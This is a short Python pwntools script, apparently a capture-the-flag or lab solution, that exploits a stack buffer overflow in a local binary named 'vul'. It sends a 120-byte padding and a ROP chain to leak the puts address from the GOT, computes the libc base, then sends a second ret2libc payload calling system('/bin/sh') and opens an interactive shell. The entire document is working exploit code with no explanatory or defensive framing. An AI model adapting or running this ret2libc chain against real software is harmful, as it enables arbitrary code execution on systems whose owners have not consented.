from pwn import *

context.log_level = 'ERROR'

elf = context.binary = ELF("./vul")
libc = ELF('/usr/lib/libc.so.6')
rop = ROP('./vul')

context.log_level = 'INFO'

pty = process.PTY
io = process(stdin=pty, stdout=pty)

junk = b'A' * 120
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
puts_got = elf.got["puts"]
puts_plt = elf.symbols["puts"]
_start = elf.symbols["_start"]

payload = junk + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(_start)

io.recvuntil(b"message: ")
io.sendline(payload)
io.recvline()
leaked_add = u64(io.recvline().strip().ljust(8, b'\x00'))
print("leaked address = " + hex(leaked_add))

puts_libc = libc.symbols["puts"]
libc_base = leaked_add - puts_libc
print("Libc Base address = " + hex(libc_base))

bin_sh =  libc_base + next(libc.search(b"/bin/sh"))
system  = libc_base + libc.symbols["system"]
exit = libc_base + libc.symbols["exit"]
ret = rop.find_gadget(["ret"]).address

payload = junk + p64(pop_rdi_ret) + p64(bin_sh) + p64(ret) + p64(system) + p64(exit)
io.recvuntil(b"message: ")
io.sendline(payload)
io.interactive()

